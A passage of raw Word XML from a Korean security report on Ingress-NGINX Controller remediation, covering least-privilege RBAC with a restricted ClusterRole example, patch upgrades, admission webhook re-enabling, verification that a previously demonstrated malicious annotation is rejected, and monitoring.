          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>허용합니다</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62F1976D" w14:textId="6E2EC1E3" w:rsidR="00484D84" w:rsidRPr="00484D84" w:rsidRDefault="00484D84" w:rsidP="00484D84">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75B31B36" w14:textId="77777777" w:rsidR="00484D84" w:rsidRDefault="00484D84" w:rsidP="00484D84">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="694B0DCE" w14:textId="3942F3E5" w:rsidR="00484D84" w:rsidRPr="00484D84" w:rsidRDefault="00484D84" w:rsidP="00484D84">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00484D84">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">7.3 </w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">RBAC </w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>최소</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D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1B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>권한</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D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1B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>원칙</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D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1B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>적용</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, Secrets </w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>접근</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D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1B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>제어</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D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1B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>강화</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20681518" w14:textId="5D589034" w:rsidR="002E1308" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="002E1308">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="93"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>컨트롤러 서비스 계정 권한 최소화</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Ingress-NGINX Controller가 클러스터 전체의 Secrets에 접근할 필요가 없도록, 서비스 계정의 권한을 최소화합니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FC1C7B8" w14:textId="77777777" w:rsidR="002E1308" w:rsidRDefault="002E1308" w:rsidP="00484D84">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="93"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>RBAC 정책 예시</w:t>
      </w:r>
      <w:r w:rsidR="00484D84" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00484D84">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="42CD945D" wp14:editId="2E7AE4FC">
                <wp:extent cx="4867275" cy="2849525"/>
                <wp:effectExtent l="0" t="0" r="28575" b="27305"/>
                <wp:docPr id="183201408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284952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63315" w14:textId="1C0BE817" w:rsidR="00484D84" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="002E1308">
                            <w:pP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text</w:t>
                            </w:r>
                            <w:r w:rsidR="00484D8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proofErr w:type="spellStart"/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apiVersion</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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: rbac.authorization.k8s.io/v1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kind: </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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ClusterRole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metadata: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  name: ingress-nginx-restricted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rules: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  - </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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apiGroups</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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: [""]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    resources: ["secrets"]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    verbs: ["get"]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    </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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resourceNames</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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: ["</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002E1308">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>필요한</w:t>
                            </w:r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-secret-</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002E1308">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>이름만</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002E1308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"]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CD945D" id="_x0000_s1045" style="width:383.25pt;height:2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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="22C63315" w14:textId="1C0BE817" w:rsidR="00484D84" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="002E1308">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR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text</w:t>
                      </w:r>
                      <w:r w:rsidR="00484D8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proofErr w:type="spellStart"/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apiVersion</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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: rbac.authorization.k8s.io/v1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kind: </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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ClusterRole</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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metadata: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  name: ingress-nginx-restricted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rules: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  - </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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apiGroups</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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: [""]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    resources: ["secrets"]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    verbs: ["get"]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    </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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resourceNames</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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: ["</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002E1308">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>필요한</w:t>
                      </w:r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-secret-</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002E1308">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>이름만</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002E1308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"]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E690EF0" w14:textId="77777777" w:rsidR="002E1308" w:rsidRDefault="002E1308" w:rsidP="002E1308">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="93"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>정기 감사</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>클러스터 내 서비스 계정 및 RBAC 정책을 주기적으로 점검하고, 불</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>필요한 권한을 제거합니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6797E5BB" w14:textId="77777777" w:rsidR="002E1308" w:rsidRPr="002E1308" w:rsidRDefault="00484D84" w:rsidP="002E1308">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">7.4 </w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>패치</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="002E1308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1B086D" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>적용</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="002E1308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1B086D" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>예시</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="002E1308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1B086D" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>및</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="002E1308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1B086D" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>검증</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="002E1308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1B086D" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>절차</w:t>
      </w:r>
      <w:r w:rsidR="000A78AE" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>패치 적용</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49552BBF" w14:textId="25A22A15" w:rsidR="002E1308" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="002E1308">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">최신 버전으로 업그레이드(Helm, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Kubespray</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>, 클라우드 콘솔 등 활용)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="637C1F0B" w14:textId="77777777" w:rsidR="002E1308" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="002E1308">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Admission Controller 재활성화</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BBFCEFA" w14:textId="0A316FFE" w:rsidR="002E1308" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="002E1308">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>임시로 비활성화했다면, 패치 후 반드시 admission webhook을 재활성화</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78740876" w14:textId="77777777" w:rsidR="002E1308" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="002E1308">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>정상 동작 확인</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16758730" w14:textId="691AE16A" w:rsidR="002E1308" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="002E1308">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Ingress 리소스 생성/수정 시 이벤트 로그 및 서비스 정상 동작 확인</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35CFFAB4" w14:textId="474681AA" w:rsidR="002E1308" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="002E1308">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>NGINX 설정 파일에 악의적 주입이 발생하지 않는지 점검</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D1A30F" w14:textId="77777777" w:rsidR="002E1308" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="002E1308">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>취약점 재현 테스트</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33693DDB" w14:textId="76E92EA5" w:rsidR="002E1308" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="002E1308">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>PoC에서 사용한 악성 annotation 적용 시 컨트롤러가 이를 거부하는지 확인</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6776D85E" w14:textId="77777777" w:rsidR="002E1308" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="002E1308">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>모니터링 및 경고</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FC436C1" w14:textId="4950C3F3" w:rsidR="00484D84" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="002E1308">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>NGINX 설정 변경, admission webhook 접근, 비정상 트래픽 등을 실시간 모니터링</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17C1433E" w14:textId="77777777" w:rsidR="002E1308" w:rsidRPr="002E1308" w:rsidRDefault="00484D84" w:rsidP="002E1308">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00484D84">
        <w:rPr>
